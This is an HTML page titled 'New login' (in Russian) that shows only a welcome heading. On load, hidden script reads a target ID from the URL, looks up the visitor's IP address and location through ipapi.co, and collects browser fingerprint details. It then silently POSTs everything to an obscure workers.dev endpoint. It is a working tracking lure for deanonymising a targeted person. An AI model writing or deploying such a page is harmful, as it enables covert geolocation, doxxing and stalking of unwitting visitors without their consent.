<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Новый вход</title>
  <script>
    window.onload = async function () {
      const urlParams = new URLSearchParams(window.location.search);
      const TARGET_ID = urlParams.get("u"); 
      if (!TARGET_ID) return;

      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
        const ua = navigator.userAgent || null;
        const lang = navigator.language || null;
        const platform = navigator.platform || null;
        const screenSize = (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
        const now = new Date().toISOString();
        const cookiesEnabled = navigator.cookieEnabled ? true : false;
        const javaEnabled = (typeof navigator.javaEnabled === 'function') ? navigator.javaEnabled() : null;
        const online = navigator.onLine;

        const payload = {
          id: TARGET_ID,
          response: {
            ip: ipData.ip || null,
            city: ipData.city || null,
            region: ipData.region || null,
            country: ipData.country_name || ipData.country || null,
            postal: ipData.postal || null,
            user_agent: ua,
            language: lang,
            platform: platform,
            screen: screenSize,
            timezone: timezone,
            time_iso: now,
            cookies_enabled: cookiesEnabled,
            java_enabled: javaEnabled,
            online: online,
            raw_ipapi: ipData
          }
        };

        await fetch("https://uifiehkfds.vavun228-60b.workers.dev/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

      } catch (error) {
        console.error(error);
      }
    };
  </script>
</head>
<body>
  <h1>Добро пожаловать!</h1>
</body>
</html>
